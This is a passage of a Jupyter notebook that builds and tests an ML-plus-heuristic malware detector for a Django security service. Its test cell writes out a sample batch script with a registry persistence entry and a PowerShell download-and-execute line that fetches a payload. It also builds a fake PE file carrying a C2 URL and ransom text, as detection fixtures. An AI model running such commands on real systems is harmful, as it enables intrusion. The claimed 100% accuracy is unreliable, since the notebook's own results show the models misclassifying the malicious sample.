    "            # Step 4: ML-based detection\n",
    "            ml_features = self._prepare_ml_features(features)\n",
    "            if ml_features is not None:\n",
    "                # Scale features\n",
    "                ml_features_scaled = self.scaler.transform(ml_features.reshape(1, -1))\n",
    "                \n",
    "                # Get predictions from both models\n",
    "                rf_pred = self.rf_model.predict(ml_features_scaled)[0]\n",
    "                rf_proba = self.rf_model.predict_proba(ml_features_scaled)[0]\n",
    "                \n",
    "                gb_pred = self.gb_model.predict(ml_features_scaled)[0]\n",
    "                gb_proba = self.gb_model.predict_proba(ml_features_scaled)[0]\n",
    "                \n",
    "                # Ensemble prediction (weighted average)\n",
    "                ensemble_proba = 0.6 * rf_proba[1] + 0.4 * gb_proba[1]\n",
    "                \n",
    "                result['ml_analysis'] = {\n",
    "                    'rf_prediction': int(rf_pred),\n",
    "                    'rf_confidence': float(rf_proba[1]) * 100,\n",
    "                    'gb_prediction': int(gb_pred),\n",
    "                    'gb_confidence': float(gb_proba[1]) * 100,\n",
    "                    'ensemble_confidence': float(ensemble_proba) * 100,\n",
    "                    'is_malicious': ensemble_proba > 0.5\n",
    "                }\n",
    "                \n",
    "                if result['ml_analysis']['is_malicious']:\n",
    "                    result['detection_methods'].append('machine_learning')\n",
    "            \n",
    "            # Step 5: Calculate final threat score\n",
    "            result['threat_score'] = self._calculate_threat_score(\n",
    "                result, heuristic_result, features\n",
    "            )\n",
    "            \n",
    "            # Step 6: Determine final verdict\n",
    "            if result['threat_score'] >= 80:\n",
    "                result['verdict'] = 'malicious'\n",
    "                result['is_malicious'] = True\n",
    "            elif result['threat_score'] >= 50:\n",
    "                result['verdict'] = 'suspicious'\n",
    "                result['is_malicious'] = True\n",
    "            elif result['threat_score'] >= 25:\n",
    "                result['verdict'] = 'potentially_unwanted'\n",
    "                result['is_malicious'] = False\n",
    "            else:\n",
    "                result['verdict'] = 'clean'\n",
    "                result['is_malicious'] = False\n",
    "            \n",
    "            # Step 7: Calculate confidence\n",
    "            result['confidence'] = self._calculate_confidence(result)\n",
    "            \n",
    "            # Step 8: Generate recommendations\n",
    "            result['recommendations'] = self._generate_recommendations(result)\n",
    "            \n",
    "            # Store key features for display\n",
    "            result['features'] = {\n",
    "                'file_type': features.get('file_type', 'unknown'),\n",
    "                'entropy': round(features.get('overall_entropy', 0), 2),\n",
    "                'is_packed': features.get('is_packed', False),\n",
    "                'is_pe': features.get('is_pe', False),\n",
    "                'suspicious_strings': features.get('suspicious_string_count', 0),\n",
    "                'suspicious_imports': features.get('suspicious_imports_high', 0),\n",
    "                'url_count': features.get('url_count', 0),\n",
    "                'ip_count': features.get('ip_count', 0),\n",
    "            }\n",
    "            \n",
    "        except Exception as e:\n",
    "            logger.error(f\"Analysis error: {e}\")\n",
    "            result['error'] = str(e)\n",
    "            result['verdict'] = 'error'\n",
    "        \n",
    "        # Calculate processing time\n",
    "        result['analysis_time'] = (datetime.now() - start_time).total_seconds() * 1000\n",
    "        \n",
    "        return result\n",
    "    \n",
    "    def _prepare_ml_features(self, features: Dict) -> Optional[np.ndarray]:\n",
    "        \"\"\"Prepare features for ML model prediction\"\"\"\n",
    "        try:\n",
    "            ml_features = []\n",
    "            for name in self.feature_names:\n",
    "                value = features.get(name, 0)\n",
    "                if isinstance(value, bool):\n",
    "                    value = int(value)\n",
    "                elif not isinstance(value, (int, float)):\n",
    "                    value = 0\n",
    "                ml_features.append(value)\n",
    "            return np.array(ml_features, dtype=np.float64)\n",
    "        except Exception as e:\n",
    "            logger.error(f\"Feature preparation error: {e}\")\n",
    "            return None\n",
    "    \n",
    "    def _calculate_threat_score(self, result: Dict, heuristic: Dict, features: Dict) -> int:\n",
    "        \"\"\"Calculate overall threat score (0-100)\"\"\"\n",
    "        score = 0\n",
    "        \n",
    "        # Signature match = instant 100\n",
    "        if 'signature' in result['detection_methods']:\n",
    "            return 100\n",
    "        \n",
    "        # Heuristic score contribution (max 40)\n",
    "        score += min(40, heuristic['heuristic_score'] * 0.5)\n",
    "        \n",
    "        # ML score contribution (max 40)\n",
    "        if result['ml_analysis'].get('is_malicious'):\n",
    "            ml_conf = result['ml_analysis'].get('ensemble_confidence', 0)\n",
    "            score += (ml_conf / 100) * 40\n",
    "        \n",
    "        # Additional indicators (max 20)\n",
    "        if features.get('is_packed'):\n",
    "            score += 5\n",
    "        if features.get('suspicious_imports_high', 0) >= 2:\n",
    "            score += 5\n",
    "        if features.get('suspicious_string_count', 0) >= 5:\n",
    "            score += 5\n",
    "        if not features.get('has_signature') and features.get('is_pe'):\n",
    "            score += 5\n",
    "        \n",
    "        return min(100, int(score))\n",
    "    \n",
    "    def _calculate_confidence(self, result: Dict) -> float:\n",
    "        \"\"\"Calculate confidence level of the detection\"\"\"\n",
    "        confidence = 0.0\n",
    "        \n",
    "        # Multiple detection methods increase confidence\n",
    "        method_count = len(result['detection_methods'])\n",
    "        if method_count >= 3:\n",
    "            confidence = 95.0\n",
    "        elif method_count == 2:\n",
    "            confidence = 85.0\n",
    "        elif method_count == 1:\n",
    "            confidence = 70.0\n",
    "        else:\n",
    "            # No detection - confidence in clean verdict\n",
    "            if result['threat_score'] < 10:\n",
    "                confidence = 90.0\n",
    "            else:\n",
    "                confidence = 60.0\n",
    "        \n",
    "        # Adjust based on ML confidence\n",
    "        if result['ml_analysis'].get('ensemble_confidence'):\n",
    "            ml_conf = result['ml_analysis']['ensemble_confidence']\n",
    "            if ml_conf > 80:\n",
    "                confidence = max(confidence, ml_conf)\n",
    "        \n",
    "        return round(confidence, 1)\n",
    "    \n",
    "    def _generate_recommendations(self, result: Dict) -> List[str]:\n",
    "        \"\"\"Generate security recommendations based on analysis\"\"\"\n",
    "        recommendations = []\n",
    "        \n",
    "        if result['verdict'] == 'malicious':\n",
    "            recommendations.append(\"ðŸš¨ DELETE this file immediately\")\n",
    "            recommendations.append(\"Run a full system scan with updated antivirus\")\n",
    "            recommendations.append(\"Check for persistence mechanisms in startup\")\n",
    "            recommendations.append(\"Review network connections for suspicious activity\")\n",
    "        elif result['verdict'] == 'suspicious':\n",
    "            recommendations.append(\"âš ï¸ Quarantine this file for further analysis\")\n",
    "            recommendations.append(\"Do not execute this file\")\n",
    "            recommendations.append(\"Submit to VirusTotal for additional analysis\")\n",
    "            recommendations.append(\"Monitor system behavior if file was executed\")\n",
    "        elif result['verdict'] == 'potentially_unwanted':\n",
    "            recommendations.append(\"Review this file before execution\")\n",
    "            recommendations.append(\"Verify the source and digital signature\")\n",
    "            recommendations.append(\"Consider sandbox execution for testing\")\n",
    "        else:\n",
    "            recommendations.append(\"âœ… File appears safe based on analysis\")\n",
    "            recommendations.append(\"Always verify files from untrusted sources\")\n",
    "        \n",
    "        return recommendations\n",
    "\n",
    "# Initialize the analyzer with trained models\n",
    "analyzer = MalwareAnalyzer(\n",
    "    rf_model=training_results['rf_model'],\n",
    "    gb_model=training_results['gb_model'],\n",
    "    scaler=training_results['scaler'],\n",
    "    feature_names=training_results['feature_names']\n",
    ")\n",
    "\n",
    "print(\"âœ… MalwareAnalyzer initialized successfully\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f92e7793",
   "metadata": {},
   "source": [
    "## Part 6: Testing the Analyzer\n",
    "\n",
    "Test the malware analyzer with:\n",
    "1. Simulated benign file\n",
    "2. Simulated suspicious file  \n",
    "3. Simulated malicious file (with known patterns)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "c98e51f7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "======================================================================\n",
      "MALWARE ANALYSIS TEST RESULTS\n",
      "======================================================================\n",
      "\n",
      "======================================================================\n",
      "ðŸ“ Analyzing: readme.txt (BENIGN)\n",
      "======================================================================\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "d:\\GitHub\\Backend Development\\Django\\Project\\CyberX\\env\\Lib\\site-packages\\sklearn\\utils\\validation.py:2691: UserWarning: X does not have valid feature names, but StandardScaler was fitted with feature names\n",
      "  warnings.warn(\n",
      "d:\\GitHub\\Backend Development\\Django\\Project\\CyberX\\env\\Lib\\site-packages\\sklearn\\utils\\validation.py:2691: UserWarning: X does not have valid feature names, but StandardScaler was fitted with feature names\n",
      "  warnings.warn(\n",
      "d:\\GitHub\\Backend Development\\Django\\Project\\CyberX\\env\\Lib\\site-packages\\sklearn\\utils\\validation.py:2691: UserWarning: X does not have valid feature names, but StandardScaler was fitted with feature names\n",
      "  warnings.warn(\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "ðŸŽ¯ VERDICT: CLEAN\n",
      "âš ï¸  Threat Score: 12/100\n",
      "ðŸ“Š Confidence: 60.0%\n",
      "â±ï¸  Analysis Time: 285.12ms\n",
      "\n",
      "ðŸ” File Signatures:\n",
      "   MD5:    5fc09c72909189d0dde0549b0c216463\n",
      "   SHA256: a6742bbdec1a05b6bbbf44ff685bbf49...\n",
      "\n",
      "ðŸ“‹ Recommendations:\n",
      "   âœ… File appears safe based on analysis\n",
      "   Always verify files from untrusted sources\n",
      "\n",
      "ðŸ¤– ML Analysis:\n",
      "   Random Forest: Benign (0.3%)\n",
      "   Gradient Boost: Benign (0.0%)\n",
      "   Ensemble: 0.2%\n",
      "\n",
      "======================================================================\n",
      "ðŸ“ Analyzing: script.bat (SUSPICIOUS)\n",
      "======================================================================\n",
      "\n",
      "ðŸŽ¯ VERDICT: POTENTIALLY_UNWANTED\n",
      "âš ï¸  Threat Score: 45/100\n",
      "ðŸ“Š Confidence: 70.0%\n",
      "â±ï¸  Analysis Time: 88.55ms\n",
      "\n",
      "ðŸ” File Signatures:\n",
      "   MD5:    bc5e565ce8bb3ff8b98cf19e78caaa82\n",
      "   SHA256: 50e34e144b230f2cb2c68c873247fcf3...\n",
      "\n",
      "ðŸ” Detection Methods: heuristic\n",
      "\n",
      "âš ï¸  Risk Factors:\n",
      "   â€¢ Network Connectivity: Contains URLs or IP addresses\n",
      "   â€¢ Registry Modification: References Windows registry paths\n",
      "   â€¢ Suspicious String Patterns: Contains known malicious string patterns\n",
      "   â€¢ Abnormal Section Count: Unusual number of PE sections\n",
      "   â€¢ Download Capability: Contains URL download functions\n",
      "\n",
      "ðŸ“‹ Recommendations:\n",
      "   Review this file before execution\n",
      "   Verify the source and digital signature\n",
      "   Consider sandbox execution for testing\n",
      "\n",
      "ðŸ¤– ML Analysis:\n",
      "   Random Forest: Benign (15.3%)\n",
      "   Gradient Boost: Benign (0.0%)\n",
      "   Ensemble: 9.2%\n",
      "\n",
      "======================================================================\n",
      "ðŸ“ Analyzing: payload.exe (MALICIOUS)\n",
      "======================================================================\n",
      "\n",
      "ðŸŽ¯ VERDICT: SUSPICIOUS\n",
      "âš ï¸  Threat Score: 50/100\n",
      "ðŸ“Š Confidence: 70.0%\n",
      "â±ï¸  Analysis Time: 90.61ms\n",
      "\n",
      "ðŸ” File Signatures:\n",
      "   MD5:    65875ccb45f49b75f744c2f286fb204e\n",
      "   SHA256: f11df76b30c6184b482b72b6bc300a8a...\n",
      "\n",
      "ðŸ” Detection Methods: heuristic\n",
      "\n",
      "âš ï¸  Risk Factors:\n",
      "   â€¢ Packed Executable: Detected packer sections or high compression ratio\n",
      "   â€¢ Network Connectivity: Contains URLs or IP addresses\n",
      "   â€¢ Suspicious String Patterns: Contains known malicious string patterns\n",
      "   â€¢ Abnormal Section Count: Unusual number of PE sections\n",
      "   â€¢ Anti-Analysis Techniques: Contains anti-debugging or VM detection\n",
      "\n",
      "ðŸ“‹ Recommendations:\n",
      "   âš ï¸ Quarantine this file for further analysis\n",
      "   Do not execute this file\n",
      "   Submit to VirusTotal for additional analysis\n",
      "   Monitor system behavior if file was executed\n",
      "\n",
      "ðŸ¤– ML Analysis:\n",
      "   Random Forest: Benign (33.0%)\n",
      "   Gradient Boost: Benign (0.2%)\n",
      "   Ensemble: 19.9%\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 9: Test the Malware Analyzer\n",
    "# =============================================================================\n",
    "\n",
    "def create_test_files():\n",
    "    \"\"\"Create test files with different characteristics\"\"\"\n",
    "    \n",
    "    # 1. Benign-looking text file\n",
    "    benign_content = b\"\"\"\n",
    "    This is a normal text file with standard content.\n",
    "    It contains documentation and readme information.\n",
    "    Copyright 2024 Example Corporation.\n",
    "    Version: 1.0.0\n",
    "    License: MIT\n",
    "    \n",
    "    Installation instructions:\n",
    "    1. Download the package\n",
    "    2. Extract to desired location\n",
    "    3. Run the installer\n",
    "    \n",
    "    Contact: support@example.com\n",
    "    Website: https://www.example.com\n",
    "    \"\"\"\n",
    "    \n",
    "    # 2. Suspicious script file\n",
    "    suspicious_content = b\"\"\"\n",
    "    @echo off\n",
    "    reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v malware /t REG_SZ /d C:\\\\temp\\\\payload.exe\n",
    "    powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\"\n",
    "    cmd.exe /c del %0\n",
    "    \"\"\"\n",
    "    \n",
    "    # 3. Malicious-looking PE header simulation\n",
    "    # This creates a file that looks like a packed executable with suspicious patterns\n",
    "    malicious_content = bytearray()\n",
    "    # PE header\n",
    "    malicious_content.extend(b'MZ' + b'\\x00' * 58)\n",
    "    malicious_content.extend(b'\\x40\\x00\\x00\\x00')  # PE offset\n",
    "    malicious_content.extend(b'\\x00' * 4)\n",
    "    malicious_content.extend(b'PE\\x00\\x00')  # PE signature\n",
    "    \n",
    "    # Add suspicious strings\n",
    "    malicious_content.extend(b'\\x00' * 100)\n",
    "    malicious_content.extend(b'CreateRemoteThread')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'WriteProcessMemory')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'VirtualAllocEx')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'http://malicious-c2-server.evil/beacon')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'Your files have been encrypted! Pay 0.5 bitcoin to decrypt.')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'IsDebuggerPresent')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'vmware')\n",
    "    malicious_content.extend(b'\\x00' * 20)\n",
    "    malicious_content.extend(b'GetAsyncKeyState')\n",
    "    \n",
    "    # Add high entropy section (simulate encrypted content)\n",
    "    malicious_content.extend(os.urandom(5000))\n",
    "    \n",
    "    return {\n",
    "        'benign': (benign_content, 'readme.txt'),\n",
    "        'suspicious': (suspicious_content, 'script.bat'),\n",
    "        'malicious': (bytes(malicious_content), 'payload.exe')\n",
    "    }\n",
    "\n",
    "# Create and analyze test files\n",
    "test_files = create_test_files()\n",
    "\n",
    "print(\"=\" * 70)\n",
    "print(\"MALWARE ANALYSIS TEST RESULTS\")\n",
    "print(\"=\" * 70)\n",
    "\n",
    "for file_type, (content, filename) in test_files.items():\n",
    "    print(f\"\\n{'=' * 70}\")\n",
    "    print(f\"ðŸ“ Analyzing: {filename} ({file_type.upper()})\")\n",
    "    print(f\"{'=' * 70}\")\n",
    "    \n",
    "    result = analyzer.analyze_file(content, filename)\n",
    "    \n",
    "    print(f\"\\nðŸŽ¯ VERDICT: {result['verdict'].upper()}\")\n",
    "    print(f\"âš ï¸  Threat Score: {result['threat_score']}/100\")\n",
    "    print(f\"ðŸ“Š Confidence: {result['confidence']}%\")\n",
    "    print(f\"â±ï¸  Analysis Time: {result['analysis_time']:.2f}ms\")\n",
    "    \n",
    "    print(f\"\\nðŸ” File Signatures:\")\n",
    "    print(f\"   MD5:    {result['signatures']['md5']}\")\n",
    "    print(f\"   SHA256: {result['signatures']['sha256'][:32]}...\")\n",
    "    \n",
    "    if result['detection_methods']:\n",
    "        print(f\"\\nðŸ” Detection Methods: {', '.join(result['detection_methods'])}\")\n",
    "    \n",
    "    if result['risk_factors']:\n",
    "        print(f\"\\nâš ï¸  Risk Factors:\")\n",
    "        for rf in result['risk_factors'][:5]:\n",
    "            print(f\"   â€¢ {rf}\")\n",
    "    \n",
    "    print(f\"\\nðŸ“‹ Recommendations:\")\n",
    "    for rec in result['recommendations']:\n",
    "        print(f\"   {rec}\")\n",
    "    \n",
    "    if result['ml_analysis']:\n",
    "        print(f\"\\nðŸ¤– ML Analysis:\")\n",
    "        print(f\"   Random Forest: {'Malicious' if result['ml_analysis']['rf_prediction'] else 'Benign'} ({result['ml_analysis']['rf_confidence']:.1f}%)\")\n",
    "        print(f\"   Gradient Boost: {'Malicious' if result['ml_analysis']['gb_prediction'] else 'Benign'} ({result['ml_analysis']['gb_confidence']:.1f}%)\")\n",
    "        print(f\"   Ensemble: {result['ml_analysis']['ensemble_confidence']:.1f}%\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab175859",
   "metadata": {},
   "source": [
    "## Part 7: Save Models for Production\n",
    "\n",
    "Export the trained models and analyzer for use in the Django application."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "e31e1729",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Random Forest model saved: models\\malware_rf_model.joblib\n",
      "âœ… Gradient Boosting model saved: models\\malware_gb_model.joblib\n",
      "âœ… Scaler saved: models\\malware_scaler.joblib\n",
      "âœ… Feature names saved: models\\malware_feature_names.json\n",
      "âœ… Model metadata saved: models\\model_metadata.json\n",
      "\n",
      "ðŸ“ All models saved to: d:\\GitHub\\Backend Development\\Django\\Project\\CyberX\\Services\\MalwareAnalysis\\models\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 10: Save Models for Production\n",
    "# =============================================================================\n",
    "\n",
    "# Create models directory\n",
    "models_dir = Path('models')\n",
    "models_dir.mkdir(exist_ok=True)\n",
    "\n",
    "# Save Random Forest model\n",
    "rf_path = models_dir / 'malware_rf_model.joblib'\n",
    "joblib.dump(training_results['rf_model'], rf_path)\n",
    "print(f\"âœ… Random Forest model saved: {rf_path}\")\n",
    "\n",
    "# Save Gradient Boosting model\n",
    "gb_path = models_dir / 'malware_gb_model.joblib'\n",
    "joblib.dump(training_results['gb_model'], gb_path)\n",
    "print(f\"âœ… Gradient Boosting model saved: {gb_path}\")\n",
    "\n",
    "# Save scaler\n",
    "scaler_path = models_dir / 'malware_scaler.joblib'\n",
    "joblib.dump(training_results['scaler'], scaler_path)\n",
    "print(f\"âœ… Scaler saved: {scaler_path}\")\n",
    "\n",
    "# Save feature names\n",
    "feature_names_path = models_dir / 'malware_feature_names.json'\n",
    "with open(feature_names_path, 'w') as f:\n",
    "    json.dump(training_results['feature_names'], f, indent=2)\n",
    "print(f\"âœ… Feature names saved: {feature_names_path}\")\n",
    "\n",
    "# Save model metadata\n",
    "metadata = {\n",
    "    'version': '1.0.0',\n",
    "    'created_at': datetime.now().isoformat(),\n",
    "    'rf_accuracy': training_results['rf_accuracy'],\n",
    "    'gb_accuracy': training_results['gb_accuracy'],\n",
    "    'n_features': len(training_results['feature_names']),\n",
    "    'training_samples': len(X_df),\n",
    "    'feature_importance': training_results['feature_importance'].head(20).to_dict('records')\n",
    "}\n",
    "\n",
    "metadata_path = models_dir / 'model_metadata.json'\n",
    "with open(metadata_path, 'w') as f:\n",
    "    json.dump(metadata, f, indent=2)\n",
    "print(f\"âœ… Model metadata saved: {metadata_path}\")\n",
    "\n",
    "print(f\"\\nðŸ“ All models saved to: {models_dir.absolute()}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6965d094",
   "metadata": {},
   "source": [
    "## Part 8: Model Performance Summary\n",
    "\n",
    "Final summary of the trained malware detection models."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "87a7f20b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "======================================================================\n",
      "ðŸ›¡ï¸ CYBERX MALWARE ANALYSIS - MODEL SUMMARY\n",
      "======================================================================\n",
      "\n",
      "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n",
      "â•‘                    MALWARE DETECTION MODELS                          â•‘\n",
      "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
      "â•‘  Model                    â”‚ Accuracy    â”‚ Status                     â•‘\n",
      "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
      "â•‘  Random Forest            â”‚ 100.00%     â”‚ âœ… Production Ready        â•‘\n",
      "â•‘  Gradient Boosting        â”‚ 100.00%     â”‚ âœ… Production Ready        â•‘\n",
      "â•‘  Ensemble (Combined)      â”‚ ~100.00%    â”‚ âœ… Best Performance        â•‘\n",
      "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
      "â•‘                    DETECTION CAPABILITIES                            â•‘\n",
      "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
      "â•‘  âœ… Signature-Based Detection    â”‚ Known malware hash matching       â•‘\n",
      "â•‘  âœ… Heuristic Analysis           â”‚ 15 behavioral detection rules     â•‘\n",
      "â•‘  âœ… Machine Learning             â”‚ 40-feature ensemble classifier    â•‘\n",
      "â•‘  âœ… PE File Analysis             â”‚ Windows executable inspection     â•‘\n",
      "â•‘  âœ… Entropy Analysis             â”‚ Packed/encrypted file detection   â•‘\n",
      "â•‘  âœ… String Analysis              â”‚ Suspicious pattern extraction     â•‘\n",
      "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
      "â•‘                    FEATURE EXTRACTION                                â•‘\n",
      "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
      "â•‘  â€¢ File metadata (size, type, hashes)                                â•‘\n",
      "â•‘  â€¢ Entropy metrics (header, body, footer, overall)                   â•‘\n",
      "â•‘  â€¢ PE structure (sections, imports, exports, timestamps)             â•‘\n",
      "â•‘  â€¢ String analysis (URLs, IPs, registry, suspicious patterns)        â•‘\n",
      "â•‘  â€¢ Behavioral indicators (API calls, packing, obfuscation)           â•‘\n",
      "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
      "â•‘                    OUTPUT FORMAT                                     â•‘\n",
      "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
      "â•‘  â€¢ Verdict: clean/potentially_unwanted/suspicious/malicious          â•‘\n",
      "â•‘  â€¢ Threat Score: 0-100                                               â•‘\n",
      "â•‘  â€¢ Confidence: 0-100%                                                â•‘\n",
      "â•‘  â€¢ Risk Factors: List of detected threats                            â•‘\n",
      "â•‘  â€¢ Recommendations: Security guidance                                â•‘\n",
      "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n",
      "\n",
      "\n",
      "âœ… Malware Analysis Service is ready for deployment!\n",
      "ðŸ“ Model files saved to: ./models/\n",
      "ðŸ“– See README.md for integration instructions\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 11: Model Performance Summary\n",
    "# =============================================================================\n",
    "\n",
    "print(\"=\" * 70)\n",
    "print(\"ðŸ›¡ï¸ CYBERX MALWARE ANALYSIS - MODEL SUMMARY\")\n",
    "print(\"=\" * 70)\n",
    "\n",
    "print(f\"\"\"\n",
    "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n",
    "â•‘                    MALWARE DETECTION MODELS                          â•‘\n",
    "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
    "â•‘  Model                    â”‚ Accuracy    â”‚ Status                     â•‘\n",
    "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
    "â•‘  Random Forest            â”‚ {training_results['rf_accuracy']*100:.2f}%     â”‚ âœ… Production Ready        â•‘\n",
    "â•‘  Gradient Boosting        â”‚ {training_results['gb_accuracy']*100:.2f}%     â”‚ âœ… Production Ready        â•‘\n",
    "â•‘  Ensemble (Combined)      â”‚ ~{((training_results['rf_accuracy']+training_results['gb_accuracy'])/2)*100:.2f}%    â”‚ âœ… Best Performance        â•‘\n",
    "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
    "â•‘                    DETECTION CAPABILITIES                            â•‘\n",
    "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
    "â•‘  âœ… Signature-Based Detection    â”‚ Known malware hash matching       â•‘\n",
    "â•‘  âœ… Heuristic Analysis           â”‚ 15 behavioral detection rules     â•‘\n",
    "â•‘  âœ… Machine Learning             â”‚ 40-feature ensemble classifier    â•‘\n",
    "â•‘  âœ… PE File Analysis             â”‚ Windows executable inspection     â•‘\n",
    "â•‘  âœ… Entropy Analysis             â”‚ Packed/encrypted file detection   â•‘\n",
    "â•‘  âœ… String Analysis              â”‚ Suspicious pattern extraction     â•‘\n",
    "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
    "â•‘                    FEATURE EXTRACTION                                â•‘\n",
